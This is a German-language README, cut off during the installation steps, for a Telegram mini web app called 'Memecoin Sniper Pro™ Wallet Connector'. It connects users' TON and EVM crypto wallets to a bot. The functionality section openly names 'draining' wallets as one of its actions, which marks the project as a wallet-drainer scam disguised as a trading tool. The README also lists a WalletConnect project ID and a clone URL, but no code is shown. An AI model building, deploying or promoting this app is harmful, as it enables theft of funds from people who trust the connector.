# Memecoin Sniper Pro™ Wallet Connector (React Web-App)

Dieses Projekt ist eine React-basierte Telegram Mini-Web-App, die es Benutzern ermöglicht, sowohl TON-kompatible als auch EVM-kompatible Krypto-Wallets mit dem Memecoin Sniper Pro™ Bot zu verbinden.

## Funktionalität

Die Web-App ermöglicht es Benutzern, ihre Wallet mit dem Bot zu verbinden, um Assets zu verwalten und Aktionen wie das Draining von Wallets durchzuführen. Sie unterstützt:
- **TON-kompatible Wallets**: Tonkeeper, Bitget Wallet, Trust Wallet, SafePal und mehr (via `@tonconnect/ui-react`).
- **EVM-kompatible Wallets**: MetaMask, Bitget Wallet, Binance Wallet und mehr (via `@reown/appkit`).

## Voraussetzungen

- Node.js (v16 oder höher)
- npm (Node Package Manager)
- Ein Reown (WalletConnect) Project ID (bereits bereitgestellt: `c713bf24fd73d14a9c78ba77af7fc727`)
- Ein GitHub-Repository, um die Web-App zu hosten

## Installation

1. Klone das Repository:

   ```bash
   git clone https://github.com/jakobhelio/Telegram-Mini-app.git
   cd Telegram-Mini-app